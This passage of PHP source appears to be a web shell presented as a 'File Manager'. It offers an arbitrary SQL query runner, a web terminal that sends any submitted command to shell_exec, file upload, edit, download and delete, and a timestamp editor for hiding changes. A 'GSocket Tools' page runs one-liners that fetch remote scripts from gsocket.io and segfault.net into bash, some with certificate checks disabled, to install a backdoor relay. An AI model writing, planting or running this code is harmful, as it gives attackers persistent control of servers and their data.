              <input type="hidden" name="sql_type" value="<?php echo h($sql_type); ?>">
              <input type="hidden" name="sql_host" value="<?php echo h($sql_host); ?>">
              <input type="hidden" name="sql_user" value="<?php echo h($sql_user); ?>">
              <input type="hidden" name="sql_pass" value="<?php echo h($sql_pass); ?>">
              <input type="hidden" name="sql_db" value="<?php echo h($sql_db); ?>">
              <label>Run SQL:</label><br>
              <textarea name="sql_query" rows="6" style="width:100%"><?php echo isset($_POST['sql_query'])?h($_POST['sql_query']):'SELECT * FROM <table> LIMIT 10'; ?></textarea><br>
              <input type="submit" name="run_query" class="btn" value="Execute">
            </form>
            <?php
              if($query_output !== null){
                if($query_output === true){
                  echo '<div class="notice">Query executed.</div>';
                } else {
                  echo '<table class="z"><tr>';
                  // try to print header
                  $first = mysqli_fetch_assoc($query_output);
                  if($first !== null){
                    foreach($first as $k=>$v) echo '<th>'.h($k).'</th>';
                    echo '</tr><tr>';
                    foreach($first as $v) echo '<td>'.h((string)$v).'</td>';
                    echo '</tr>';
                    while($r = mysqli_fetch_assoc($query_output)){
                      echo '<tr>';
                      foreach($r as $v) echo '<td>'.h((string)$v).'</td>';
                      echo '</tr>';
                    }
                  } else {
                    echo '<td class="muted">No rows</td></tr>';
                  }
                  echo '</table>';
                }
              }
            ?>
          </div>

          <!-- show table rows -->
          <?php if($show_table): ?>
            <h4 style="margin-top:14px;color:#6f6">Table: <?php echo h($show_table); ?></h4>
            <?php if(count($cols)): ?>
              <table class="z"><tr>
                <?php foreach($cols as $c): ?><th><?php echo h($c['Field']); ?></th><?php endforeach; ?>
                <th>Actions</th>
              </tr>
              <?php foreach($rows as $r): ?>
                <tr>
                  <?php foreach($cols as $c): $f=$c['Field']; ?>
                    <td><?php echo h(mb_strimwidth((string)$r[$f],0,140,'...')); ?></td>
                  <?php endforeach; ?>
                  <td>
                    <?php
                      // get PK columns
                      $pk_cols = array();
                      if($resk = @mysqli_query($mysqli, "SHOW KEYS FROM `".mysqli_real_escape_string($mysqli,$show_table)."` WHERE Key_name='PRIMARY'")){
                          while($k = mysqli_fetch_assoc($resk)) $pk_cols[] = $k['Column_name'];
                          mysqli_free_result($resk);
                      }
                      if(count($pk_cols)){
                          $qs = '?act=sql';
                          $qs .= '&sql_host='.urlencode($sql_host).'&sql_user='.urlencode($sql_user).'&sql_pass='.urlencode($sql_pass).'&sql_db='.urlencode($sql_db);
                          $qs .= '&edit_row='.urlencode($show_table);
                          foreach($pk_cols as $pn){
                              $qs .= '&pk_'.urlencode($pn).'='.urlencode($r[$pn]);
                          }
                          echo '<a class="link" href="'.h($qs).'">Edit</a> ';
                          // delete form
                          $pk_names = json_encode($pk_cols);
                          $pk_vals = array();
                          foreach($pk_cols as $pn) $pk_vals[] = $r[$pn];
                          $pk_vals_js = json_encode($pk_vals);
                          // inline form
                          echo '<form method="post" style="display:inline">';
                          echo '<input type="hidden" name="table_name" value="'.h($show_table).'">';
                          echo '<input type="hidden" name="pk_names" value="'.h($pk_names).'">';
                          echo '<input type="hidden" name="pk_vals" value="'.h($pk_vals_js).'">';
                          echo '<input type="submit" name="delete_row" value="Delete" class="btn" onclick="return confirm(\'Delete this row?\')">';
                          echo '</form>';
                      } else {
                          echo '<span class="muted">No PK</span>';
                      }
                    ?>
                  </td>
                </tr>
              <?php endforeach; ?>
              </table>
            <?php else: ?>
              <div class="muted">No columns</div>
            <?php endif; ?>

          <?php endif; ?>

          <!-- edit row form -->
          <?php if($edit_row): ?>
            <h4 style="margin-top:12px;color:#6ef">Edit Row</h4>
            <form method="post">
              <input type="hidden" name="table_name" value="<?php echo h($_GET['edit_row']); ?>">
              <?php
                // pk names and vals
                $pk_names = array_keys($pk_info);
                $pk_vals = array_values($pk_info);
                echo '<input type="hidden" name="pk_names" value="'.h(json_encode($pk_names)).'">';
                echo '<input type="hidden" name="pk_vals" value="'.h(json_encode($pk_vals)).'">';
                echo '<table class="z">';
                foreach($edit_row as $k=>$v){
                    echo '<tr><th>'.h($k).'</th><td>';
                    echo '<input type="text" name="fields['.h($k).']" value="'.h($v).'" style="width:100%">';
                    echo '</td></tr>';
                }
                echo '</table>';
              ?>
              <input type="submit" name="save_row" value="Save" class="btn">
              <a class="link" href="?act=sql&show_table=<?php echo urlencode($_GET['edit_row']); ?>">Cancel</a>
            </form>
          <?php endif; ?>

        <?php else: ?>
          <div class="muted">Not connected or no tables. Fill connection and click Connect.</div>
        <?php endif; ?>
      </div>

    </body></html>
    <?php
    exit; // stop rest of fm.php
}

// ---------- GS SOCKET WEB TERMINAL (FULL PAGE) ----------
if(isset($_GET['act']) && $_GET['act']==='gs'){

    $tools = [
        "Install GSocket wget" => 'bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"',
        "Install GSocket curl" => 'bash -c "$(curl -fsSL https://gsocket.io/y)"',
        "Uninstall GSocket wget" => 'GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" && pkill defunct',
        "Uninstall GSocket curl" => 'GS_UNDO=1 bash -c "$(curl --fsSL https://gsocket.io/y)" && pkill defunct',
        "Install GSocket ssl curl" => 'GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"',
        "Install GSocket ssl wget" => 'GS_NOCERTCHECK=1 bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/y)"',
        "Install GSocket port wget" => 'wget --no-hsts http://nossl.segfault.net/deploy-all.sh && bash deploy-all.sh && rm -f deploy-all.sh',
        "Install GSocket port curl" => 'curl -fsSL http://nossl.segfault.net/deploy-all.sh -o deploy-all.sh && bash deploy-all.sh && rm -f deploy-all.sh',
    ];

    $output = '';
    $cmd_name = '';
    if(isset($_POST['tool']) && isset($tools[$_POST['tool']])){
        $cmd_name = $_POST['tool'];
        $output = shell_exec($tools[$cmd_name] . ' 2>&1');
    }

    ?>
    <!doctype html>
    <html><head><meta charset="utf-8"><title>GSocket Tools</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
    body{background:#000;color:#cfcfcf;font-family:monospace;margin:8px}
    .hdr{background:#052C3A;color:#6fe;font-size:22px;padding:8px 12px;border-radius:4px;text-align:center;margin-bottom:8px}
    .btn{background:#a00;color:#fff;padding:6px 10px;border:none;cursor:pointer;margin:4px;border-radius:3px;width:100%}
    form{margin-bottom:12px}
    textarea{width:100%;height:400px;resize:none;background:#111;color:#9ef;border:1px solid #0f0;padding:6px;font-family:monospace}
    a.link{color:#6ef;text-decoration:none}
    </style>
    </head><body>
      <div class="hdr">GSocket Tools Menu</div>
      <div class="toolbar"><a class="link" href="?">← Back to File Manager</a></div>
      <form method="post">
        <?php foreach($tools as $name=>$cmd): ?>
            <button type="submit" name="tool" value="<?php echo htmlspecialchars($name); ?>" class="btn"><?php echo htmlspecialchars($name); ?></button>
        <?php endforeach; ?>
      </form>
      <?php if($output): ?>
        <h3>Output: <?php echo htmlspecialchars($cmd_name); ?></h3>
        <textarea readonly><?php echo htmlspecialchars($output); ?></textarea>
      <?php endif; ?>
    </body></html>
    <?php
    exit;
}

// ---------- WEB TERMINAL HANDLER (FULL PAGE) ----------
if(isset($_GET['act']) && $_GET['act']==='terminal'){
   $term_output = '';
    $cmd = '';
    if(isset($_POST['cmd']) && trim($_POST['cmd'])!==''){
        $cmd = trim($_POST['cmd']);
        $term_output = shell_exec($cmd . ' 2>&1');
    }
    ?>
    <!doctype html>
    <html><head><meta charset="utf-8"><title>Web Terminal</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
    body{background:#000;color:#cfcfcf;font-family:monospace;margin:8px}
    .hdr{background:#052C3A;color:#6fe;font-size:22px;padding:8px 12px;border-radius:4px;text-align:center;margin-bottom:8px}
    input,textarea{background:#111;color:#9ef;border:1px solid #0f0;padding:6px;font-family:monospace}
    input[type=text]{width:80%}
    textarea{width:100%;height:400px;resize:none}
    .btn{background:#a00;color:#fff;padding:6px 10px;border:none;cursor:pointer;margin-top:4px;border-radius:3px}
    .toolbar{margin-bottom:12px}
    a.link{color:#6ef;text-decoration:none}
    </style>
    </head><body>
      <div class="hdr">Web Terminal</div>
      <div class="toolbar">
        <a class="link" href="?">← Back to File Manager</a>
      </div>
      <form method="post">
        <input type="text" name="cmd" placeholder="Enter command" value="<?php echo htmlspecialchars($cmd); ?>">
        <input type="submit" class="btn" value="Run">
      </form>
      <textarea readonly><?php echo htmlspecialchars($term_output); ?></textarea>
    </body></html>
    <?php
    exit;
}


// ----------------- Normal File Manager HTML -----------------
?>
<!doctype html>
<html><head><meta charset="utf-8"><title>File Manager</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{background:#000;color:#cfcfcf;font-family:monospace;margin:12px}
.header{color:#9ef;margin-bottom:8px;font-size:13px}
.upload-form{margin-bottom:12px}
.table{width:100%;border-collapse:collapse;font-size:13px}
.table th{background:transparent;color:#ddd;padding:8px;border-bottom:1px solid #1a1a1a;text-align:left}
.table td{padding:6px 8px;border-bottom:1px solid #111;vertical-align:middle}
.name a{color:#9ef;text-decoration:none}
.small{font-size:12px;color:#9ad}
.perm{color:#0f0;font-weight:700}
.bad{color:#f66}
.actions a, .actions button{ display:inline-block; width:28px; text-align:center; color:#0f0; background:transparent; border:none; cursor:pointer; font-weight:bold; margin-right:4px; padding:2px 0; line-height:1.2; text-decoration:none;}
.tooltip{position:relative; display:inline-block;}
.tooltip .tooltiptext{visibility:hidden;background-color:#111;color:#0f0;text-align:center;padding:2px 6px;border-radius:4px;position:absolute;z-index:100;bottom:125%;left:50%;transform:translateX(-50%);opacity:0;transition:opacity 0.3s;font-size:12px;}
.tooltip:hover .tooltiptext{visibility:visible;opacity:1;}
.rename-inline{display:none;margin-left:4px;}
.rename-inline input[type=text]{padding:2px 4px; background:#111;color:#0f0;border:1px solid #0f0;}
.rename-inline input[type=submit]{padding:2px 6px; background:#0f0;color:#000;border:none;cursor:pointer;}
.parent-row td{background:#070707;color:#9ef}
.owner{color:#9ad}
.modify{color:#9ad}
#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;z-index:9999;color:#0f0;padding:50px;font-family:monospace;}
#overlay pre{background:#000;color:#0f0;border:1px solid #0f0;padding:8px;overflow:auto;max-height:400px;}
</style>
<script>
function toggleInlineForm(id,inputName,inputValue){
    var el=document.getElementById(id); if(!el) return;
    var all=document.querySelectorAll('.rename-inline');
    for(var i=0;i<all.length;i++) if(all[i]!=el) all[i].style.display='none';
    el.style.display=(el.style.display==='inline-block')?'none':'inline-block';
    var inp=el.querySelector('input[name="'+inputName+'"]'); if(inp) inp.value=inputValue;
}

</script>
</head><body>

<div class="header">
<b>System Info:</b><br>
Uname: <?php echo h($uname); ?><br>
User: <?php echo h($uid.' [ '.$user.' ]'); ?> Group: <?php echo h($gid.' [ '.$groups.' ]'); ?><br>
PHP: <?php echo h($phpver); ?> Safe Mode: <?php echo h($phpsafe); ?><br>
ServerIP: <?php echo h($server_ip); ?> Your IP: <?php echo h($client_ip); ?><br>
DateTime: <?php echo h($datetime); ?><br>
Domains: <?php echo h($domains); ?><br>
HDD: Total: <?php echo h($disk_total); ?> Free: <?php echo h($disk_free); ?> [<?php echo h($disk_percent); ?>%]<br>
[ <a href="?act=shell">Process Shell</a> ]  [ <a href="?act=sql">SQL Manager</a> ] [ <a href="?act=terminal">Terminal</a> ] [ <a href="?act=gs">gs</a> ] [ <a href="?logout=1">Logout</a> ]
</div>

<?php
// --- NOTIFIKASI ---
if(isset($_GET['msg'])) 
    echo '<div style="color:#ff0;background:#111;padding:6px;margin-bottom:6px;">'.htmlspecialchars($_GET['msg']).'</div>';
?>

<form class="upload-form" method="post" enctype="multipart/form-data">
    <input type="file" name="file_to_upload">
    <input type="submit" name="upload_file" value="Upload">
</form>

<div class="small">PWD:
<?php
$parts = explode(DIRECTORY_SEPARATOR, trim($CWD,DIRECTORY_SEPARATOR));
$acc='';
echo DIRECTORY_SEPARATOR;
foreach($parts as $p){
    $acc .= DIRECTORY_SEPARATOR.$p;
    echo '<a href="?path='.urlencode($acc).'">'.h($p).'</a>/';
}
?>
[ <a href="?path=<?php echo urlencode($HOME_SHELL); ?>">Home Shell</a> ]
</div>

<table class="table"><tr><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>
<?php
$parent=dirname($CWD);
if($parent!==$CWD) echo '<tr class="parent-row"><td colspan="6"><a href="?path='.urlencode($parent).'">.. (parent)</a></td></tr>';

$items=@scandir($CWD);
if($items===false) echo '<tr><td colspan="6" class="bad">Cannot open directory</td></tr>';
else{
    $dirs=[]; $files=[];
    foreach($items as $it){ if($it==='.'||$it==='..') continue; $full=$CWD.DIRECTORY_SEPARATOR.$it; is_dir($full)?$dirs[]=$it:$files[]=$it; }
    $items=array_merge($dirs,$files);
    foreach($items as $it){
        $full=$CWD.DIRECTORY_SEPARATOR.$it;
        $isDir=is_dir($full); $isReadable=is_readable($full);
        $sizeTxt=$isDir?'dir':($isReadable?human_size(filesize($full)):'N/A');
        $modify=@date("Y-m-d H:i:s",@filemtime($full));
        $owner=owner_group($full);
        $permTxt=perms_text($full);
        $permClass=$isReadable?'perm':'bad';

        echo '<tr>';
        echo '<td class="name">'.(!$isDir?'<a href="?path='.urlencode($CWD).'&edit='.urlencode($full).'">'.h($it).'</a>':'<a href="?path='.urlencode($full).'">'.h($it).'</a>').'</td>';
        echo '<td class="'.$permClass.'">'.h($sizeTxt).'</td>';
        echo '<td class="modify">'.h($modify).'</td>';
        echo '<td class="owner">'.h($owner).'</td>';
        echo '<td class="'.$permClass.'">'.h($permTxt).'</td>';
        echo '<td class="actions">';
        $rid='rn'.md5($full); $tid='tk'.md5($full);

        // R
        echo '<span class="tooltip"><button type="button" onclick="toggleInlineForm(\''.$rid.'\',\'rename_old\',\''.h($full).'\')">R</button><span class="tooltiptext">Rename</span></span>';
        echo '<span id="'.$rid.'" class="rename-inline"><form method="post" style="display:inline">';
        echo '<input type="hidden" name="rename_old" value=""><input type="text" name="rename_new" style="width:110px" placeholder="newname">';
        echo '<input type="submit" name="rename_submit" class="btn" value="OK"></form></span> ';

        // T
        echo '<span class="tooltip"><button type="button" onclick="toggleInlineForm(\''.$tid.'\',\'touch_target\',\''.h($full).'\')">T</button><span class="tooltiptext">Edit Time</span></span>';
        echo '<span id="'.$tid.'" class="rename-inline"><form method="post" style="display:inline">';
        echo '<input type="hidden" name="touch_target" value=""><input type="text" name="touch_time" placeholder="YYYY-MM-DD hh:mm" style="width:140px">';
        echo '<input type="submit" name="touch" class="btn" value="Set"></form></span> ';

        // E
        echo '<span class="tooltip"><a href="?path='.urlencode($CWD).'&edit='.urlencode($full).'">E</a><span class="tooltiptext">Editor</span></span> ';

        // X
        echo '<span class="tooltip"><a href="#" onclick="if(confirm(\'Delete '.h($it).' ?\')){ var f=document.createElement(\'form\'); f.method=\'post\'; f.style.display=\'none\'; var inp=document.createElement(\'input\'); inp.name=\'delete\'; inp.value=\'1\'; f.appendChild(inp); var t=document.createElement(\'input\'); t.type=\'hidden\'; t.name=\'delete_target\'; t.value=\''.h($full).'\'; f.appendChild(t); document.body.appendChild(f); f.submit(); } return false;">X</a><span class="tooltiptext">Delete</span></span> ';

        // D
        echo '<span class="tooltip"><a href="?download='.urlencode($full).'">D</a><span class="tooltiptext">Download</span></span>';


        echo '</td></tr>';
    }
}
?>
</table>

<?php
if(isset($_GET['edit'])){
    $ef=realpath($_GET['edit']);
    if($ef!==false && is_file($ef) && is_readable($ef)){
        echo '<hr><h3>Edit: '.h($ef).'</h3>';
        $cont=@file_get_contents($ef);
        echo '<form method="post">';
        echo '<input type="hidden" name="edit_file" value="'.h($ef).'">';
        echo '<textarea name="edit_content" style="width:100%;height:320px;background:#000;color:#9ef;border:1px solid #222;padding:8px;">'.h($cont).'</textarea><br>';
        echo '<input type="submit" name="save_edit" class="btn" value="Save"> ';
        echo '<a class="btn" href="?path='.urlencode($CWD).'">Cancel</a>';
        echo '</form>';
    }
}
?>

</body></html>